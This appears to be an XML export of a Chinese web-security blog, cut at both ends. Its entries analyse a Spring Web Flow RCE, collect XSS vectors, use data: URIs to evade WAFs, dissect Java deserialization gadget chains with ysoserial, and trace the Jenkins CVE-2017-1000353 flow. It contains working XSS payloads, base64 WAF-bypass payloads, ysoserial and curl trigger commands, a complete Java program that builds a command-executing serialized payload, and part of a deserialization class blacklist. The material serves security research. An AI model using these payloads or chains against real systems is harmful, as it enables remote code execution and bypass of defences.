expressionParser将设置为SpelExpressionParser对象的实例，而不是BeanWrapperExpressionParser对象的实例。当调用getValueType函数时，SpelExpressionParser对象将执行表达式，触发任意代码执行。 补丁分析从补丁可以看出，直接将ExpressionParser设置为BeanWrapperExpressionParser对象的实例， 默认是执行不了表达式的。 Ref CVE-2017-4971: Remote Code Execution Vulnerability In The Spring Web Flow Framework CVE-2017-4971：Spring WebFlow 远程代码执行漏洞分析 Spring Web Flow 2.0 入门 Spring 表达式语言 (SpEL)]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[collect xss vector]]></title>
    <url>%2F2017%2F06%2F08%2Fcollect-xss-vector%2F</url>
    <content type="text"><![CDATA[tagmarquee1&lt;marquee onstart=alert(1)&gt;xss&lt;/marquee&gt; svg12# &lt;svg&gt;&lt;script&gt;\u&#123;61&#125;lert`1`&lt;script&gt;&lt;/svg&gt;&lt;svg&gt;&lt;script&gt;&amp;#x0005C;u&amp;lcub;61&amp;#125;le&lt;/&gt;rt&amp;grave;1&amp;grave;&lt;/script&gt;&lt;/svg&gt; body1&lt;body onload=```$&#123;prompt``&#125;`&gt;]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DATA URI Bypass WAF]]></title>
    <url>%2F2017%2F06%2F07%2FDATA-URI-Bypass-WAF%2F</url>
    <content type="text"><![CDATA[DATA URI“Used to embed small items of data into a URL—rather than link to an external resource, the URL contains the actual encoded data. URIs are supported by most modern browsers except for some versions of Internet Explorer.” Data URI 是一种提供让外置资源的直接内嵌在页面中的方案。这种技术允许我们只需单次 HTTP 请求即可获取所有需要引用的图片与样式资源。 在 RFC2397（http://tools.ietf.org/html/rfc2397）中定义了它格式规范： 1data:[&lt;mime type&gt;][;charset=&lt;charset&gt;][;base64],&lt;encoded data&gt; Bypass WAF一般来说，WAF识别XSS向量，主要通过以下规则 html标签，如: &lt;script&gt;, &lt;iframe&gt;, &lt;object&gt;, &lt;svg&gt;等 event handlers, 如: onload, onerror data Attribute js keyword, 如: alert(), confirm() 使用DATA URI利用base64编码数据绕过WAF对xss payload的检测。那么如何使用DATA URI执行javascript呢？ object tag12# base64 decode: &lt;script&gt;alert(1);&lt;/script&gt;&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=&quot;&gt; 通常WAF都会拦截&lt;object&gt;标签 svg tags参考 http://insert-script.blogspot.com.au/2014/02/svg-fun-time-firefox-svg-vector.html, 使用svg + use执行javascript. test.html for firefox 1234567891011&lt;svg&gt;&lt;use xlink:href=&quot;data:image/svg+xml;base64,PHN2ZyBpZD0icmVjdGFuZ2xlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiAgICB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCI+DQo8YSB4bGluazpocmVmPSJqYXZhc2NyaXB0OmFsZXJ0KGxvY2F0aW9uKSI+PHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEwMCIgaGVpZ2h0PSIxMDAiIC8+PC9hPg0KPC9zdmc+#rectangle&quot; /&gt;&lt;/svg&gt; base64 payload 解码为: 12345678&lt;svg id=&quot;rectangle&quot;xmlns=&quot;http://www.w3.org/2000/svg&quot;xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot;width=&quot;100&quot; height=&quot;100&quot;&gt;&lt;a xlink:href=&quot;javascript:alert(location)&quot;&gt;&lt;rect x=&quot;0&quot; y=&quot;0&quot; width=&quot;100&quot; height=&quot;100&quot; /&gt;&lt;/a&gt;&lt;/svg&gt; 当点击黑色方框时会触发XSS.要达到自动触发XSS的目的，可以使用如下paylaod: 123456789101112131415&lt;svg id=&quot;rectangle&quot;xmlns=&quot;http://www.w3.org/2000/svg&quot;xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot;width=&quot;100&quot; height=&quot;100&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;foreignObject width=&quot;100&quot; height=&quot;50&quot;requiredExtensions=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;embed xmlns=&quot;http://www.w3.org/1999/xhtml&quot;src=&quot;javascript:alert(location)&quot; /&gt;&lt;/foreignObject&gt;&lt;/svg&gt; better test.html for firefox 12345678910111213141516&lt;svg&gt;&lt;use xlink:href=&quot;data:image/svg+xml;base64,PHN2ZyBpZD0icmVjdGFuZ2xlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiAgICB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCI+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg0KIDxmb3JlaWduT2JqZWN0IHdpZHRoPSIxMDAiIGhlaWdodD0iNTAiDQogICAgICAgICAgICAgICAgICAgcmVxdWlyZWRFeHRlbnNpb25zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4NCgk8ZW1iZWQgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiIHNyYz0iamF2YXNjcmlwdDphbGVydChsb2NhdGlvbikiIC8+DQogICAgPC9mb3JlaWduT2JqZWN0Pg0KPC9zdmc+#rectangle&quot; /&gt;&lt;/svg&gt; img tags1&lt;img src=&quot;data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=&quot; onload=alert(1)&gt;]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>XSS</tag>
        <tag>DATA URI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ysoserial反序列化研究]]></title>
    <url>%2F2017%2F05%2F20%2Fysoserial%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%A0%94%E7%A9%B6%2F</url>
    <content type="text"><![CDATA[demo环境搭建源码分析ysoserial, 了解java反序列化利用的常见方式，光说不练假把式，搭建demo环境，测试ysoserial利用的实际效果。 开发环境 InteliJ IDEA JDK 1.8.0_112-b16 tomcat 8.5 MAC OS 新建项目”SimpleWebDemo”,再新建servlet文件”SimpleServlet”,项目配置如下图: SimpleServlet源码如下: 1234567891011121314151617181920212223242526package demo;import javax.servlet.ServletInputStream;import java.io.*;/** * Created by js on 2017/5/19. */public class SimpleServlet extends javax.servlet.http.HttpServlet &#123; protected void doPost(javax.servlet.http.HttpServletRequest request, javax.servlet.http.HttpServletResponse response) throws javax.servlet.ServletException, IOException &#123; ServletInputStream sis = request.getInputStream(); ObjectInputStream ois = new ObjectInputStream(sis); try &#123; ois.readObject(); &#125; catch (ClassNotFoundException e) &#123; e.printStackTrace(); &#125; ois.close(); &#125; protected void doGet(javax.servlet.http.HttpServletRequest request, javax.servlet.http.HttpServletResponse response) throws javax.servlet.ServletException, IOException &#123; PrintWriter out = response.getWriter(); out.println("This is a demo"); &#125;&#125; 利用ysoserial生成payload: 1java -jar ysoserial-v0.0.4.jar CommonsCollections5 &quot;open -a Calculator&quot; &gt; calc.payload curl访问触发漏洞: 1curl &quot;http://127.0.0.1:8080/demo&quot; --data-binary &quot;@./calc.payload&quot; ysoserial反序列化利用查看反序列化用到的组件及所需满足的条件: java -jar ysoserial-v0.0.4.jar 12345678910111213141516171819202122232425262728293031Y SO SERIAL?Usage: java -jar ysoserial-[version]-all.jar [payload type] &apos;[command to execute]&apos; Available payload types: BeanShell1 [org.beanshell:bsh:2.0b5] C3P0 [com.mchange:c3p0:0.9.5.2, com.mchange:mchange-commons-java:0.2.11] CommonsBeanutils1 [commons-beanutils:commons-beanutils:1.9.2, commons-collections:commons-collections:3.1, commons-logging:commons-logging:1.2] CommonsCollections1 [commons-collections:commons-collections:3.1] CommonsCollections2 [org.apache.commons:commons-collections4:4.0] CommonsCollections3 [commons-collections:commons-collections:3.1] CommonsCollections4 [org.apache.commons:commons-collections4:4.0] CommonsCollections5 [commons-collections:commons-collections:3.1] CommonsCollections6 [commons-collections:commons-collections:3.1] FileUpload1 [commons-fileupload:commons-fileupload:1.3.1, commons-io:commons-io:2.4] Groovy1 [org.codehaus.groovy:groovy:2.3.9] Hibernate1 [] Hibernate2 [] JBossInterceptors1 [javassist:javassist:3.12.1.GA, org.jboss.interceptor:jboss-interceptor-core:2.0.0.Final, javax.enterprise:cdi-api:1.0-SP1, javax.interceptor:javax.interceptor-api:3.1, org.jboss.interceptor:jboss-interceptor-spi:2.0.0.Final, org.slf4j:slf4j-api:1.7.21] JRMPClient [] JRMPListener [] JSON1 [net.sf.json-lib:json-lib:jar:jdk15:2.4, org.springframework:spring-aop:4.1.4.RELEASE, aopalliance:aopalliance:1.0, commons-logging:commons-logging:1.2, commons-lang:commons-lang:2.6, net.sf.ezmorph:ezmorph:1.0.6, commons-beanutils:commons-beanutils:1.9.2, org.springframework:spring-core:4.1.4.RELEASE, commons-collections:commons-collections:3.1] JavassistWeld1 [javassist:javassist:3.12.1.GA, org.jboss.weld:weld-core:1.1.33.Final, javax.enterprise:cdi-api:1.0-SP1, javax.interceptor:javax.interceptor-api:3.1, org.jboss.interceptor:jboss-interceptor-spi:2.0.0.Final, org.slf4j:slf4j-api:1.7.21] Jdk7u21 [] Jython1 [org.python:jython-standalone:2.5.2] MozillaRhino1 [rhino:js:1.7R2] Myfaces1 [] Myfaces2 [] ROME [rome:rome:1.0] Spring1 [org.springframework:spring-core:4.1.4.RELEASE, org.springframework:spring-beans:4.1.4.RELEASE] Spring2 [org.springframework:spring-core:4.1.4.RELEASE, org.springframework:spring-aop:4.1.4.RELEASE, aopalliance:aopalliance:1.0, commons-logging:commons-logging:1.2] URLDNS [] Wicket1 [wicket-util:wicket-util:6.23] 可以看出ysoyerial支持多种组件，而最常见的就是commons-collections组件了。因此有必要分析ysoserial利用commons-collections组件构造反序列化POP链的原理。 commons-collectionscommons-collections1依赖条件 commons-collections:3.1 调用链 1234567891011121314151617Gadget chain: ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() &lt;== 触发调用 transform() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() http://gursevkalra.blogspot.cz/2016/01/ysoserial-commonscollections1-exploit.htmlhttps://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html http://blog.knownsec.com/2016/03/java-deserialization-commonsbeanutils-pop-chains-analysis/]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JAVA反序列化漏洞知识点整理]]></title>
    <url>%2F2017%2F05%2F07%2FJAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[jenkins反序列漏洞跟过一遍之后，虽说梳理清楚了漏洞触发的大体流程，但是对于JAVA反序列化漏洞导致代码执行的原理仍旧不懂，因此有必要整理JAVA反序列化漏洞相关的知识点。 JAVA反序列化漏洞反序列化漏洞的本质是反序列化机制打破了数据和对象的边界，导致攻击者注入的恶意序列化数据在反序列化过程中被还原成对象，控制了对象就可能在目标系统上面执行攻击代码，而不可信的输入和未检测反序列化对象的安全性是导致反序列化漏洞的常见原因。Java序列化常应用于RMI(Java Remote Method Invocatio, 远程方法调用)， JMX(Java Management Extensions, Java管理扩展), JMS(Java Message Service, Java消息服务) 技术中。 利用Apache Commons Collections实现远程代码执行Apache Commons Collections作为一种公用库，其中实现的一些类可以被反序列化用来实现任意代码执行。这里以以Apache Commons Collections 3.2.1为例，解释如何构造对象，能够让程序在反序列化，即调用readObject()时，就能直接实现任意代码执行。 利用反射机制执行任意代码国外研究人员发现InvokerTransformer类中的transform()方法允许通过反射, 执行参数对象的某个方法，并返回执行结果。 123456789101112131415161718192021222324252627public class InvokerTransformer implements Transformer, Serializable &#123; private static final long serialVersionUID = -8653385846894047688L; private final String iMethodName; private final Class[] iParamTypes; private final Object[] iArgs; private InvokerTransformer(String methodName) &#123; this.iMethodName = methodName; this.iParamTypes = null; this.iArgs = null; &#125; public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args; &#125; public Object transform(Object input) &#123; if(input == null) &#123; return null; &#125; else &#123; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); &#125; 可以看到，通过transform()方法里的反射，成功调用了StringBuffer类的append()方法并返回结果。 调用transform()方法接下来就是要找到某种类，会自动调用InvokerTransformer类中的transform()方法，构造代码执行。明显调用transform()方法有以下两个类: TransformedMap LazyMap TransformedMapApache Commons Collections中实现TransformedMap类，用来对Map进行某种变换，只要调用其decorate()方法，传入key和value的变换对象Transformer，即可从任意Map对象生成相应的TransformedMap，decorate()方法如下： 123public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123; return new TransformedMap(map, keyTransformer, valueTransformer);&#125; Transformer是一个接口，其中定义的transform()方法用来将一个对象转换成另一个对象。如下所示： 123public interface Transformer &#123; public Object transform(Object input);&#125; 而前面提到的InvokerTransformer类实现了Transformer接口，因此这里就找到了调用InvokerTransformer类transform()方法的途径。那么，现在需要知道的是触发TransformedMap类调用Transformer的条件是什么？ commons-collections 3.2.2指出当执行Map类的put()方法或MapEntry类的setValue()方法会自动调用Transformer。另外多个Transformer还能串起来，形成ChainedTransformer。 从图中可以看出调用Map类的put()方法会自动调用InvokerTransformer类的transform()方法。 LazyMapLazyMap实现了Map接口，其中的get(Object)方法调用了transform()方法，跟进函数进去 123456789public Object get(Object key) &#123; // create value for key if key is not currently in the map if (map.containsKey(key) == false) &#123; Object value = factory.transform(key); map.put(key, value); return value; &#125; return map.get(key);&#125; 这里可以看到，在调用transform()方法之前会先判断当前Map中是否已经有该key，如果没有最终会由这里的factory.transform()进行处理，跟踪facory变量找到decorate()方法。 123public static Map decorate(Map map, Transformer factory) &#123; return new LazyMap(map, factory);&#125; 这里的decorate()方法会对factory进行初始化，同时实例化一个LazyMap，为了能成功调用transform()方法，找到了LazyMap，发现在get()方法中调用了transform()方法，那么现在漏洞利用的核心条件就是去寻找一个类，在对象进行反序列化时会调用我们精心构造对象的get(Object)方法。 突破限制条件TransformedMap虽然找到了自动调用InvokerTransformer类的transform()方法的途径，但是需要满足其触发条件：执行Map类的put()方法或MapEntry类的setValue()方法。显然这种方式还不够优雅，最佳条件是反序列化(调用readObject()方法)时就自动调用InvokerTransformer类的transform()方法导致代码执行。 java运行库中的AnnotationInvocationHandler类, 有一个成员变量memberValues是Map类型，而且readObject()方法中对memberValues的每一项调用了setValue()方法。 1234567891011121314151617181920212223242526272829303132333435363738class AnnotationInvocationHandler implements InvocationHandler, Serializable &#123; private final Class&lt;? extends Annotation&gt; type; private final Map&lt;String, Object&gt; memberValues; AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123; this.type = type; this.memberValues = memberValues; &#125; private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException &#123; s.defaultReadObject(); // Check to make sure that types have not evolved incompatibly AnnotationType annotationType = null; try &#123; annotationType = AnnotationType.getInstance(type); &#125; catch(IllegalArgumentException e) &#123; // Class is no longer an annotation type; all bets are off return; &#125; Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes(); for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123; String name = memberValue.getKey(); Class&lt;?&gt; memberType = memberTypes.get(name); if (memberType != null) &#123; // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) &#123; // 此处触发一系列的Transformer memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + "[" + value + "]").setMember( annotationType.members().get(name))); 因此，我们只需要用前面构造的Map来构造AnnotationInvocationHandler，进行序列化，当触发readObject()反序列化的时候，就能实现命令执行。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263//import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.util.HashMap;import java.util.Map;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;/** * Created by js on 2017/5/6. */public class Test &#123; public static void main(String[] args) throws Exception &#123; /* * Runtime.getRuntime().exec("open /Applications/Calculator.app"); */ String command = (args.length != 0) ? args[0] : "/bin/sh,-c,open /Applications/Calculator.app"; String[] execArgs = command.split(","); Transformer[] transforms = new Transformer[] &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer( "getMethod", new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;"getRuntime", new Class[0]&#125; ), new InvokerTransformer( "invoke", new Class[] &#123;Object.class, Object[].class&#125;, new Object[] &#123;null, new Object[0]&#125; ), new InvokerTransformer( "exec", new Class[] &#123;String[].class&#125;, new Object[] &#123;execArgs&#125; ) &#125;; Transformer transformerChain = new ChainedTransformer(transforms); Map tempMap = new HashMap(); // tempMap 不能为空 tempMap.put("hack", "you"); Map exMap = TransformedMap.decorate(tempMap, null, transformerChain); Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler"); Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class); ctor.setAccessible(true); Object instance = ctor.newInstance(Target.class, exMap); File f = new File("payload1"); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(f)); oos.writeObject(instance); oos.flush(); oos.close(); ObjectInputStream ois = new ObjectInputStream(new FileInputStream(f)); // 触发代码执行 Object newObj = ois.readObject(); ois.close(); &#125;&#125; 这段恶意代码本质上就是利用反射调用Runtime() 执行了一段系统命令，作用等同于: 1((Runtime) Runtime.class.getMethod("getRuntime", null).invoke(null, null)).exec("/bin/sh -c open /Applications/Calculator.app") 当然，反序列化时自动执行任意代码还有其他方式，具体可以分析ysoserial源码，这里就不一一叙述。采用AnnotationInvocationHandler类也是有条件限制的，是否能成功利用与JDK的版本有关, http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d。 AnnotationInvocationHandler类移除了对memberValue.setValue()的调用，因此也就不能用AnnotationInvocationHandler+TransformedMap来构造POP链了。 LazyMapAnnotationInvocationHandler构造函数初始化lLazyMap对象, 只需要找到一个memberValues.get(Object)的方法即可触发该漏洞，可惜的是readObject()方法里面并没有这个方法. 在invoke()方法中memberValues.get(Object)被调用了，如下: AnnotationInvocationHandler类实现了InvocationHandler接口，所以它可以代理其他对象。这里利用这个特点，代理一个Map对象，得到mapProxy代理对象。然后，将mapProxy赋值到AnnotationInvocationHandler类中，当其调用mapProxy方法时，便可以触发invoke()方法。然后，便可以执行transform链。 核心代码如下： 123456789101112131415161718Transformer transformerChain = new ChainedTransformer(transforms);Map tempMap = new HashMap();Map lazyMap = LazyMap.decorate(tempMap, transformerChain);String classToSerialize = "sun.reflect.annotation.AnnotationInvocationHandler";final Constructor&lt;?&gt; constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];constructor.setAccessible(true);InvocationHandler firstInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);Proxy evilProxy = (Proxy) Proxy.newProxyInstance(Test.class.getClassLoader(), new Class[] &#123;Map.class&#125;, firstInvocationHandler );InvocationHandler invocationHandlerToSerialize = (InvocationHandler) constructor.newInstance(Override.class, evilProxy);File f = new File("expLazyMap.payload");ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(f));oos.writeObject(invocationHandlerToSerialize);oos.flush();oos.close(); 参考 http://www.angelwhu.com/blog/?p=394 Lib之过？Java反序列化漏洞通用利用分析 Commons Collections Java反序列化漏洞深入分析 https://github.com/frohoff/ysoserial https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet common-collections中Java反序列化漏洞导致的RCE原理分析 从反序列化到命令执行 - Java 中的 POP 执行链 http://blog.nsfocus.net/java-deserialization-vulnerability-overlooked-mass-destruction/ http://techshow.ctrip.com/archives/1414.html]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Jenkins 未授权远程代码执行漏洞(CVE-2017-1000353)]]></title>
    <url>%2F2017%2F05%2F05%2FJenkins-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2017-1000353%2F</url>
    <content type="text"><![CDATA[漏洞概要Jenkins 未授权远程代码执行漏洞, 允许攻击者将序列化的Java SignedObject对象传输给Jenkins CLI处理，反序列化ObjectInputStream作为Command对象，这将绕过基于黑名单的保护机制, 导致代码执行。 漏洞触发执行流程SSD的报告披露了完整的漏洞细节，作为才学JAVA的我来说，看完这份报告，依旧不清楚具体的执行流程，因此有了下文，梳理漏洞触发的具体执行流程。 触发jenkins反序列化导致代码执行的漏洞发生在使用HTTP协议实现双向通信通道的代码中，Jenkins利用此通道来接收命令。大致流程如下图: 如何建立双向Channel基于HTTP建立双向Channel的入口函数位于jenkins-2.46.1/core/src/main/java/hudson/cli/CLIAction.java文件中 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253@Extension @Symbol("cli")@Restricted(NoExternalUse.class)public class CLIAction implements UnprotectedRootAction, StaplerProxy &#123; private transient final Map&lt;UUID,FullDuplexHttpChannel&gt; duplexChannels = new HashMap&lt;UUID, FullDuplexHttpChannel&gt;(); ...... @Override public Object getTarget() &#123; StaplerRequest req = Stapler.getCurrentRequest(); if (req.getRestOfPath().length()==0 &amp;&amp; "POST".equals(req.getMethod())) &#123; // CLI connection request throw new CliEndpointResponse(); &#125; else &#123; return this; &#125; &#125; private class CliEndpointResponse extends HttpResponseException &#123; @Override public void generateResponse(StaplerRequest req, StaplerResponse rsp, Object node) throws IOException, ServletException &#123; try &#123; // do not require any permission to establish a CLI connection // the actual authentication for the connecting Channel is done by CLICommand UUID uuid = UUID.fromString(req.getHeader("Session")); rsp.setHeader("Hudson-Duplex",""); // set the header so that the client would know FullDuplexHttpChannel server; if(req.getHeader("Side").equals("download")) &#123; duplexChannels.put(uuid,server=new FullDuplexHttpChannel(uuid, !Jenkins.getActiveInstance().hasPermission(Jenkins.ADMINISTER)) &#123; @Override protected void main(Channel channel) throws IOException, InterruptedException &#123; // capture the identity given by the transport, since this can be useful for SecurityRealm.createCliAuthenticator() channel.setProperty(CLICommand.TRANSPORT_AUTHENTICATION, Jenkins.getAuthentication()); channel.setProperty(CliEntryPoint.class.getName(),new CliManagerImpl(channel)); &#125; &#125;); try &#123; server.download(req,rsp); &#125; finally &#123; duplexChannels.remove(uuid); &#125; &#125; else &#123; duplexChannels.get(uuid).upload(req,rsp); &#125; &#125; catch (InterruptedException e) &#123; throw new IOException(e); &#125; &#125; &#125;&#125; 从上述代码可知，建立一对双向通道(download/upload), 需要发送两次POST请求，根据请求头Session字段的值uuid识别不同的双向通道，Side字段的值识别download或upload通道，请求发送的顺序是先发送download请求再发送upload请求，跟进download函数(/Users/js/IdeaProjects/vulnhub/jenkins-2.46.1/core/src/main/java/hudson/model/FullDuplexHttpChannel.java), 当服务器收到download请求时会阻塞请求，等待upload请求，收到upload请求后，新建Channel对象处理upload请求和返回响应，代码如下: 123456789101112131415161718192021222324252627282930313233343536public synchronized void download(StaplerRequest req, StaplerResponse rsp) throws InterruptedException, IOException &#123; ...... &#123;// wait until we have the other channel long end = System.currentTimeMillis() + CONNECTION_TIMEOUT; while (upload == null &amp;&amp; System.currentTimeMillis()&lt;end) wait(1000); if (upload==null) throw new IOException("HTTP full-duplex channel timeout: "+uuid); &#125; try &#123; channel = new Channel("HTTP full-duplex channel " + uuid, Computer.threadPoolForRemoting, Mode.BINARY, upload, out, null, restricted); ...... &#125; finally &#123; // publish that we are done completed=true; notify(); &#125; &#125; public synchronized void upload(StaplerRequest req, StaplerResponse rsp) throws InterruptedException, IOException &#123; rsp.setStatus(HttpServletResponse.SC_OK); InputStream in = req.getInputStream(); if(DIY_CHUNKING) in = new ChunkedInputStream(in); // publish the upload channel upload = in; notify(); // wait until we are done while (!completed) wait(); &#125; 以上就是建立双向通道的基本过程。 Channel对象启动ReaderThreadupload请求作为输入流实例化Channel对象(~/.m2/repository/org/jenkins-ci/main/remoting/3.7/remoting-3.7-sources.jar!/hudson/remoting/Channel.java), Channel类的构造链比较繁琐如下图， 最终调用的构造方法为Channel(ChannelBuilder settings, CommandTransport transport), 该构造方法的transport参数，由ChannelBuilder类的negotiate()方法获得。 12345678910111213141516171819202122protected CommandTransport negotiate(final InputStream is, final OutputStream os) throws IOException &#123; ...... &#123;// read the input until we hit preamble Mode[] modes=&#123;Mode.BINARY,Mode.TEXT&#125;; byte[][] preambles = new byte[][]&#123;Mode.BINARY.preamble, Mode.TEXT.preamble, Capability.PREAMBLE&#125;; int[] ptr=new int[3]; Capability cap = new Capability(0); // remote capacity that we obtained. If we don't hear from remote, assume no capability while(true) &#123; int ch = is.read(); ...... for(int i=0;i&lt;preambles.length;i++) &#123; byte[] preamble = preambles[i]; if(preamble[ptr[i]]==ch) &#123; if(++ptr[i]==preamble.length) &#123; switch (i) &#123; case 0: case 1: ...... return makeTransport(is, os, mode, cap); case 2: cap = Capability.read(is); negotiate()会检查输入(upload请求)的前导码, 所有发往Jenkins CLI的命令中都包含某种格式的前导码（preamble），前导码格式通常为：&lt;===[JENKINS REMOTING CAPACITY]===&gt;rO0ABXNyABpodWRzb24ucmVtb3RpbmcuQ2FwYWJpbGl0eQAAAAAAAAABAgABSgAEbWFza3hwAAAAAAAAAH4=, 该前导码包含一个经过base64编码的序列化对象。“Capability”类型的序列化对象的功能是告诉服务器客户端具备哪些具体功能（比如HTTP分块编码功能）。 最后调用makeTransport()方法返回CommandTransport对象, 根据cap是否支持Chunking返回不同的对象ChunkedCommandTransport或ClassicCommandTransport。 1234567891011121314protected CommandTransport makeTransport(InputStream is, OutputStream os, Mode mode, Capability cap) throws IOException &#123; FlightRecorderInputStream fis = new FlightRecorderInputStream(is); if (cap.supportsChunking()) return new ChunkedCommandTransport(cap, mode.wrap(fis), mode.wrap(os), os); else &#123; ObjectOutputStream oos = new ObjectOutputStream(mode.wrap(os)); oos.flush(); // make sure that stream preamble is sent to the other end. avoids dead-lock return new ClassicCommandTransport( new ObjectInputStreamEx(mode.wrap(fis),getBaseLoader(),getClassFilter()), oos,fis,os,cap); &#125;&#125; 利用SSD的PoC脚本发送的upload请求返回的是ClassicCommandTransport对象，其继承关系如下图所示。 Channel构造函数Channel(ChannelBuilder settings, CommandTransport transport)中, transport.setup()调用SynchronousCommandTransport类的setup()方法来启动一个ReaderThread线程。 1234public void setup(Channel channel, CommandReceiver receiver) &#123; this.channel = channel; new ReaderThread(receiver).start(); &#125; 读取Command对象通过上面的ReaderThread.start()方法启动一个线程，ReaderThread为SynchronousCommandTransport类的内部类，在run()方法中，调用ClassicCommandTransport类的read()方法读取输入，read()方法实际是调用Command类的readFrom()方法读取，通过反序列化输入返回一个Command对象。 123456789101112131415private final class ReaderThread extends Thread &#123; ...... public ReaderThread(CommandReceiver receiver) &#123; super("Channel reader thread: "+channel.getName()); this.receiver = receiver; &#125; @Override public void run() &#123; final String name =channel.getName(); try &#123; while(!channel.isInClosed()) &#123; Command cmd = null; try &#123; cmd = read(); 123public final Command read() throws IOException, ClassNotFoundException &#123; try &#123; Command cmd = Command.readFrom(channel, ois); 在反序列化输入返回一个Command对象时就执行了cmd命令，而不是通过正常的回调handle()方法执行cmd命令，反序列化导致的执行代码触发的相关异常如下: 类型转换异常ClassCastException: org.apache.commons.collections.map.ReferenceMap cannot be cast to hudson.remoting.Command. 正常执行Command虽说反序列化时就执行了cmd代码，这里也顺带了解下正常的执行cmd的过程。SynchronousCommandTransport类的run()方法中，获得返回的Command对象(cmd)，然后调用receiver.handle(cmd);处理命令，其实质是回调Channel类构造方法里面的handle方法，而传入handle方法的cmd参数就是反序列化得到的Command对象。 12345transport.setup(this, new CommandReceiver() &#123; public void handle(Command cmd) &#123; ...... try &#123; cmd.execute(Channel.this); 绕过黑名单保护机制上面过程主要讲述的是漏洞触发的流程，而该漏洞的核心是反序列化Java SignedObject对象会绕过黑名单保护机制，从而导致的代码执行漏洞。 ClassFilter类定义的默认的黑名单如下： 12345678910111213141516171819202122232425262728private static final String[] DEFAULT_PATTERNS = &#123; "^bsh[.].*", "^com[.]google[.]inject[.].*", "^com[.]mchange[.]v2[.]c3p0[.].*", "^com[.]sun[.]jndi[.].*", "^com[.]sun[.]corba[.].*", "^com[.]sun[.]javafx[.].*", "^com[.]sun[.]org[.]apache[.]regex[.]internal[.].*", "^java[.]awt[.].*", "^java[.]rmi[.].*", "^javax[.]management[.].*", "^javax[.]naming[.].*", "^javax[.]script[.].*", "^javax[.]swing[.].*", "^org[.]apache[.]commons[.]beanutils[.].*", "^org[.]apache[.]commons[.]collections[.]functors[.].*", "^org[.]apache[.]myfaces[.].*", 